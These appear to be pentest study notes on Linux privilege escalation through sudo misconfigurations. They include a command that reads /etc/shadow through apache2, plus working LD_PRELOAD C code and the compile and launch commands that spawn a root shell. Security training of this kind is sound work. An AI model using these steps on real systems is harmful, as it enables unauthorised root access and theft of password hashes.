#LinuxPrivEsc 
The sudo command, by default, allows you to run a program with root privileges
Any user can check its current situation related to root privileges using the `sudo -l` command

[https://gtfobins.github.io/](https://gtfobins.github.io/) is a valuable source that provides information on how any program, on which you may have sudo rights, can be used

#### Leverage application functions
*apache2*
	An important flag is `-f`, this will load an alternate ServerConfigFile
	`apache2 -f /etc/shadow`

#### Leverage LD_PRELOAD
![[LD_PRELOAD.JPG]]
[LD_PRELOAD](https://rafalcieslak.wordpress.com/2013/04/02/dynamic-linker-tricks-using-ld_preload-to-cheat-inject-features-and-investigate-programs/)
LD_PRELOAD is a function that allows any program to use shared libraries. If the "env_keep" option is enabled we can generate a shared library which will be loaded and executed before the program is run. LD_PRELOAD option will be ignored if the real user ID is different from the effective user ID
The following code spawns a root shell:
```C
#include <stdio.h>  
#include <sys/types.h>  
#include <stdlib.h>  
  
void _init() {  
unsetenv("LD_PRELOAD");  
setgid(0);  
setuid(0);  
system("/bin/bash");  
}
```
Compile it into a shared object (.so)
`gcc -fPIC -shared -o shell.so shell.c -nostartfiles`
Use this shared object file when launching any program our user can run with sudo
`sudo LD_PRELOAD=$PWD/shell.so find`